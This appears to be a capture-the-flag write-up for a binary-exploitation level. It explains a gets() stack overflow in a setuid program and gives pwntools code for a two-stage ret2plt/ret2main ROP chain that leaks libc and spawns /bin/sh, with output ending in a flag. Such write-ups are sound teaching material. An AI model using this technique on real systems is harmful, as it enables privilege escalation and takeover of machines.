```sh
level02@override:~$ checksec finn
[*] '/home/level02/finn'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
level02@override:~$ file finn
finn: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=629960426c3e3e471de37ad296c01606db7d0a40, for GNU/Linux 3.2.0, stripped

```

From the information above, we understand that we have no stack canary, no PIE protection, and no RELRO. This means any address we can extract from the executable object is static and valid (which we will be using heavily in our exploit).

After taking a look at the `.c` file of the executable, we can see the following interesting parts of the code:

```c
__asm__(
    ".text\n"
    ".globl _finn_gadgets\n"
    "_finn_gadgets:\n"
    "    pop %rdi\n"
    "    pop %rsi\n"
    "    pop %rdx\n"
    "    ret\n"
);

static void handle_transaction(void) {
    char request[INPUT_SIZE];
    list_items();
    printf("[FINN] Request: ");
    fflush(stdout);
    gets(request);
    if (strncmp(request, "BUY:", 4) == 0) {
        unsigned int id = (unsigned int)strtoul(request + 4, NULL, 10);
        if (id < stash_count)
            printf("[FINN] Sold: %s\n", stash[id].name);
        else
            printf("[FINN] Not in stock.\n");
    } else if (strncmp(request, "INFO:", 5) == 0) {
        unsigned int id = (unsigned int)strtoul(request + 5, NULL, 10);
        if (id < stash_count)
            printf("[FINN] %s — value %04x flags %u\n",
                stash[id].name, stash[id].value, stash[id].flags);
    } else {
        printf("[FINN] Unknown request.\n");
    }
}

```

First things first, we can easily spot our buffer overflow vulnerability at the `gets(request)` line in the `handle_transaction` function. We also got some major help from the challenge authors, as they provided us with a custom assembly gadget called `_finn_gadgets` right in the code. This will be incredibly useful in our exploitation process.

So, the idea is the following:

1. We will use the `.plt` trampoline. Specifically, we will call the PLT entry for the `puts` function.
2. We will give that trampoline a specific first argument (via the `pop rdi` gadget): the GOT address of `puts`. When the `puts` function executes, it will read from that GOT address and print out the actual memory address of `puts` inside `libc`.

What does this idea do for us? In the previous challenge, we used a pre-leaked `libc` address provided by the program to calculate the ASLR offset and call `/bin/sh`. This time, instead of relying on the author to give us the leak, we are forcing the binary to leak the address for us!

Just an additional detail: after the leak occurs, we need to recall the `main` function (or the program entry point) so the program doesn't crash. This allows us to send a second payload to get our shell executed. In cybersecurity literature, this technique is called **ret2plt + ret2main** (or a Two-Stage ROP).

Here is the python code that does the PLT leaking trick:

```py
# Get the static addresses from the binary's PLT and GOT
printf_got = elf.got['printf']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
MAIN_PLT = elf.entry

rop = ROP(elf)
rop_rdi_rsi_rdx = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]
print(f"printf GOT entry is at: {hex(printf_got)} {hex(puts_got)} {hex(rop_rdi_rsi_rdx)}")

p = connect()
p.recvuntil(b"[FINN] Request: ", timeout=TIMEOUT)
padding = 128

# Stage 1 Payload: Leak puts address and restart main
payload = b'A'*padding + p64(0x0) + p64(rop_rdi_rsi_rdx) + p64(puts_got) + p64(0) + p64(0) + p64(puts_plt) + p64(MAIN_PLT) + b'\n'
p.send(payload)
p.recvuntil(b"[FINN] Unknown request.\n", timeout=TIMEOUT)

# Parse the leaked address sent back by puts
leaked_puts = p.recvline().strip()
leaked_puts_address = u64(leaked_puts.ljust(8, b'\x00'))

print("Leaked puts address: ", hex(leaked_puts_address))

```

Finally, once the program restarts and asks for input again, we just follow the old trick of calculating the `libc` base and sending a standard `system("/bin/sh")` payload.

Here is our result:

```sh
level02@override:~$ echo "" > exploit.py  && vim exploit.py && python3 exploit.py 
[*] '/home/level02/finn'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
[*] Loaded 13 cached gadgets for './finn'
printf GOT entry is at: 0x403510 0x403508 0x401236
[+] Starting local process './finn': pid 2323
leaked put address :  0x7518d3287cc0
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
Before using the leaked offset puts: 0x87cc0
After using the leaked offset puts: 0x7518d3287cc0
[*] Loaded 112 cached gadgets for '/lib/x86_64-linux-gnu/libc.so.6'
/home/level02/exploit.py:54: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  ROP_SH  = next(libc.search('/bin/sh'))
system 0x7518d3258750
flag{t2k26doin8ab2t66bppvu8ql4vwarcq7}
[*] Process './finn' stopped with exit code -1 (SIG_IGN) (pid 2323)

```